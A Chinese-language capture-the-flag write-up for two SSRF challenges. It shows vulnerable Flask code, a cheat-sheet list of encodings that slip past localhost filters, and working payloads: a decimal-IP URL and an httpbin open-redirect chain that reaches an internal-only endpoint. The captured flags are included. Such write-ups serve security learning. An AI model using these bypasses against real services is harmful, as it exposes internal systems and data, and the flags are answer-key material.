#Web 


給了一個網址，點開來：
![[W4-6_web.png]]


---
# SSRF1
## 題目

網站可以替你發送 HTTP 請求。


```js
from flask import Flask, request, render_template, abort, send_file
from urllib.parse import urlparse
from config import flag
import requests

app = Flask(__name__)

@app.route("/mkreq", methods=["GET"])
def make_request():
    url = request.args.get("url")
    if urlparse(url).hostname in ["localhost", "127.0.0.1", "::1"]:
        return "badhacker"
    return requests.get(url).text

@app.route("/internal-only")
def internal_only():
    if request.remote_addr != "127.0.0.1":
        abort(403)
    return flag

@app.route("/")
def home():
    if request.args.get("debug"):
        return send_file(__name__ + ".py")
    return render_template("index.html")

if __name__ == "__main__":
    app.run(host="0.0.0.0", debug=True)
```


## 解題
1. 題目 SSRF，會導向輸入的網址，e.g. 輸入 `https://google.com`
   會進入網址 `/mkreq?url=https://google.com` 並回傳網頁
2. 觀察程式碼，發現
   - flag 在 `/internal-only`，要求位址必須是 `127.0.0.1`
   - 會擋 "`localhost`", "`127.0.0.1`", "`::1`"  等輸入   
     -> 去 [Web-CTF-Cheatsheet](https://github.com/w181496/Web-CTF-Cheatsheet?tab=readme-ov-file#bypass-127001) 找更多繞過方式
     ```
	127.0.0.1
	127.00000.00000.0001
	localhost
	127.0.1
	127.1
	0.0.0.0
	0.0
	0
	--
	::1
	::127.0.0.1
	::ffff:127.0.0.1
	::1%1
	--
	127.12.34.56 (127.0.0.1/8)
	127.0.0.1.xip.io
	--
	http://2130706433 (decimal)
	http://0x7f000001
	http://017700000001
	http://0x7f.0x0.0x0.0x1
	http://0177.0.0.1
	http://0177.01.01.01
	http://0x7f.1
	http://[::]
     ```
1. 用數字 `2130706433` 代替 `127.0.0.1`
   ```
   http://2130706433/internal-only
   ```
2. flag = `CTF{55rf_15_1n7r4n37_k1ll3r!}`

---

# SSRF2
## 題目

```js
@app.route("/mkreq", methods=["GET"])
def make_request():
    url = request.args.get("url")
    if not urlparse(url).hostname.startswith("httpbin.dev"):
        return "badhacker"
    return requests.get(url, verify=False).text
```

## 解題
1. 條件相較於 [[#SSRF1]] ，變成指定要由 `httpbin.dev` 開始
2. 輸入 `http://httpbin.dev` 進入網頁
   ![[W4-7_httpbin_dev.png|533]]
   往下滑尋找可以用的東西
   ![[W4-7_httpbin_redirect.png|557]]
3. 輸入 `http://httpbin.dev/redirect-to?url=http://127.0.0.1/internal-only`
4. flag = `CTF{y0u_4r3_r34lly_4_55rf_0p3n_r3d1r3c7_m4573r}`